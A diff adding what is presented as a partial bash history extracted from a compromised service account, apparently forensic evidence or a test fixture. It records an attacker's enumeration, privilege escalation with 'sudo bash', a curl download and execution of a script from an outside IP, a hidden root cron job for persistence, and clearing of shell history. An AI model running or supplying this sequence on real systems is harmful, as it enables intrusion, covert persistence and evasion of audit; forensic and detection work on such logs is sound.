@@ -1,0 +1,23 @@
+# Extracted snippet: /home/svc_backup/.bash_history (partial)
+whoami
+hostname
+id
+w
+last -a | head
+sudo -l
+uname -a
+# quick enumeration
+ss -tulpen | head
+getent passwd | tail
+# privilege escalation (sudo misconfig)
+sudo bash
+mkdir -p /usr/local/bin/.sys
+URL=http://198.51.100.23/.cache/patch.sh
+curl -fsSL "$URL" -o /tmp/.upd
+chmod +x /tmp/.upd && /tmp/.upd --install
+# decoy download (never executed)
+curl -fsSL http://198.51.100.23/.cache/rotate.sh -o /tmp/.rotate
+# persistence
+printf '19-59/17 * * * * root test -x /usr/local/bin/.sys/update.sh && /bin/bash /usr/local/bin/.sys/update.sh --silent\n' | tee /etc/cron.d/.sys-update
+# clean up
+history -c
